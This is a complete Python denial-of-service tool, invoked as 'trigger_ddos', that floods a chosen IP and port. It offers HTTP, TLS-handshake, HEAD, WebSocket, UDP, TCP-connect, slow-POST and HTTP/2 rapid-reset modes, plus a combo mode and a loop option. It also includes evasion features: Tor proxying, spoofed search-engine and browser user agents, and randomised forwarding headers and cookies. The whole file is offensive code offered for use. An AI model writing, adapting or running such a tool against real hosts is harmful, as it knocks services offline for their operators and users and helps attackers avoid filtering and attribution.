#!/usr/bin/env python3
import os
import socket, threading, random, time, sys, ssl
import socks  # PySocks for Tor support

try:
    from scapy.all import IP, UDP, send, Raw
except ImportError:
    print("⚠️ Scapy not installed. Run: pip3 install scapy")
    sys.exit(1)

try:
    from hyper import HTTPConnection
    from hyper.http20.frame import HeadersFrame, RstStreamFrame
    from hyper.http20.exceptions import HyperException
except ImportError:
    print("⚠️ Hyper not installed. Run: pip3 install hyper")
    sys.exit(1)

USE_TOR = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1)",
    "curl/7.64.1",
    "Wget/1.20.3",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
]

STEALTH_HEADERS = [
    "X-Forwarded-For", "Referer", "Origin", "Cache-Control", "X-Real-IP"
]

def stealth_http_headers():
    headers = {
        ":method": "GET",
        ":path": f"/?q={random.randint(1000,9999)}",
        ":scheme": "https",
        ":authority": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "user-agent": random.choice(USER_AGENTS),
        "accept-language": random.choice([
            "en-US,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"
        ]),
        "referer": f"https://{random.choice(['google.com', 'bing.com', 'yahoo.com', 'duckduckgo.com'])}/search?q={random.randint(1000,9999)}",
        "x-forwarded-for": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "cookie": f"sessionid={os.urandom(8).hex()}; token={os.urandom(4).hex()}",
        "connection": "keep-alive"
    }
    return headers

def get_socket():
    if USE_TOR:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    return s

def http_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = get_socket()
                s.connect((ip, port))
                uri = f"/?q={random.randint(1000,9999)}"
                req = f"GET {uri} HTTP/1.1\r\nHost: {ip}\r\n" + ''.join(f"{k}: {v}\r\n" for k, v in stealth_http_headers().items()) + "\r\n"
                s.send(req.encode())
                s.close()
            except: pass
    run_threads(attack, threads, duration, "HTTP Flood")

def tls_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                context = ssl.create_default_context()
                s = get_socket()
                s = context.wrap_socket(s, server_hostname=ip)
                s.connect((ip, port))
                s.close()
            except: pass
    run_threads(attack, threads, duration, "TLS Handshake Flood")

def head_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = get_socket()
                s.connect((ip, port))
                req = f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n" + ''.join(f"{k}: {v}\r\n" for k, v in stealth_http_headers().items()) + "\r\n"
                s.send(req.encode())
                s.close()
            except: pass
    run_threads(attack, threads, duration, "HEAD Request Flood")

def ws_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = get_socket()
                s.connect((ip, port))
                req = (
                    f"GET /chat HTTP/1.1\r\nHost: {ip}\r\nUpgrade: websocket\r\n"
                    f"Connection: Upgrade\r\nSec-WebSocket-Key: {random.randbytes(16).hex()}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n" + ''.join(f"{k}: {v}\r\n" for k, v in stealth_http_headers().items()) + "\r\n"
                )
                s.send(req.encode())
                time.sleep(1.5)
                s.close()
            except: pass
    run_threads(attack, threads, duration, "WebSocket Flood")

def udp_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        payload = random._urandom(1024)
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, port))
            except: pass
    run_threads(attack, threads, duration, "UDP Flood")

def tcp_syn_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket()
                s.connect((ip, port))
                s.close()
            except: pass
    run_threads(attack, threads, duration, "TCP SYN Flood")

def slow_post_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        payload = "X" * 1024
        while time.time() < end:
            try:
                s = get_socket()
                s.connect((ip, port))
                s.send(f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Length: {len(payload)*100}\r\n".encode())
                for _ in range(100):
                    s.send((payload + "\r\n").encode())
                    time.sleep(0.3)
                s.close()
            except: pass
    run_threads(attack, threads, duration, "Slow POST (RUDY)")

def http2_flood(ip, port, duration, threads):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                # Set up HTTP/2 connection with TLS and ALPN
                context = ssl.create_default_context()
                context.set_alpn_protocols(['h2'])
                s = get_socket()
                s = context.wrap_socket(s, server_hostname=ip)
                s.connect((ip, port))
                
                # Initialize HTTP/2 connection
                conn = HTTPConnection(ip, port=port, secure=True, ssl_context=context, socket=s)
                
                # Rapidly open and reset streams
                stream_id = 1  # Client uses odd stream IDs
                while time.time() < end:
                    try:
                        # Send HEADERS frame to open a stream
                        headers = stealth_http_headers()
                        conn.request('GET', headers[':path'], headers=headers)
                        
                        # Immediately send RST_STREAM with CANCEL (0x8)
                        rst_frame = RstStreamFrame(stream_id)
                        rst_frame.error_code = 0x8  # CANCEL
                        conn._send_frame(rst_frame)
                        
                        stream_id += 2  # Increment to next odd stream ID
                    except (HyperException, socket.error):
                        break  # Reconnect on error
                s.close()
            except: pass
    run_threads(attack, threads, duration, "HTTP/2 Rapid-Reset Flood")

def combo_flood(ip, port, duration, threads):
    print(f"[🔥] Launching COMBO mode: all floods simultaneously...")
    flood_funcs = [
        http_flood, tls_flood, head_flood, ws_flood,
        udp_flood, tcp_syn_flood, slow_post_flood, http2_flood
    ]
    for func in flood_funcs:
        threading.Thread(target=func, args=(ip, port, duration, threads), daemon=True).start()
    time.sleep(duration)
    print("[✓] Combo flood complete.\n")

def run_threads(attack_func, threads, duration, label):
    print(f"[~] Starting {label} for {duration}s with {threads} threads...")
    for _ in range(threads):
        t = threading.Thread(target=attack_func)
        t.daemon = True
        t.start()
    time.sleep(duration)
    print(f"[✓] {label} complete.\n")

def parse_trigger(args):
    if len(args) < 6:
        print("Usage: trigger_ddos <ip> <port> <duration> <threads> <mode> [--loop]")
        print("Modes: http | tls | head | ws | udp | tcp | slowpost | http2 | combo")
        sys.exit(1)

    _, ip, port, duration, threads, mode, *flags = args
    port = int(port)
    duration = int(duration)
    threads = int(threads)
    loop = "--loop" in flags

    print(f"[✓] Mode: {mode.upper()} | Target: {ip}:{port} | Threads: {threads} | Duration: {duration}s")

    if loop:
        print("[∞] Loop mode: ON. Press Ctrl+C to stop.\n")
        try:
            while True:
                run_mode(mode, ip, port, duration, threads)
        except KeyboardInterrupt:
            print("\n[✘] Loop stopped by user.")
    else:
        run_mode(mode, ip, port, duration, threads)

def run_mode(mode, ip, port, duration, threads):
    if mode == "http":
        http_flood(ip, port, duration, threads)
    elif mode == "tls":
        tls_flood(ip, port, duration, threads)
    elif mode == "head":
        head_flood(ip, port, duration, threads)
    elif mode == "ws":
        ws_flood(ip, port, duration, threads)
    elif mode == "udp":
        udp_flood(ip, port, duration, threads)
    elif mode == "tcp":
        tcp_syn_flood(ip, port, duration, threads)
    elif mode == "slowpost":
        slow_post_flood(ip, port, duration, threads)
    elif mode == "http2":
        http2_flood(ip, port, duration, threads)
    elif mode == "combo":
        combo_flood(ip, port, duration, threads)
    else:
        print("Invalid mode.")

if __name__ == "__main__":
    parse_trigger(sys.argv)
